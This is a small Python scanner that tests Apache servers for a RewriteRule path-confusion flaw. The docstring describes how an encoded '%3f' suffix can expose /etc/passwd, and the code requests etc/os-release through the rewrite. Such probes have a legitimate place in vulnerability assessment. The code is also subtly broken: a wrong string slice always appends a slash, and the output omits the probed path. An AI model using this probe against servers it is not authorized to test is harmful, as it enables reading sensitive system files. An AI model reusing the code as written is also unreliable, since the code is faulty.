'''

    source: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/

    if an apache webserver has a rule like
        RewriteEngine On
        RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"
    then a response to request like /user/etc/passwd%3f will be non 404 on vulnerable apache versions
        it will generally be 403 Forbidden
        it may be 200 & return /etc/passwd on very bad configurations
        

'''
import requests
import argparse

# parse args
parser = argparse.ArgumentParser()
parser.add_argument('--url', help="url to scan (http://host/path/)")
args = parser.parse_args()
url = args.url
if not url:
    url = input()

file_name = 'etc/os-release%3f'

# url should be something like http://host/path/ or http://host/path
def do_request(url):
    global file_name
    if (url[:-1] != '/'):
        url = f'{url}/'

    url = f'{url}{file_name}'
    r = requests.get(url)
    return r.status_code


response_status = do_request(url)

if response_status != 404:
    print(f'[{response_status}] {url}')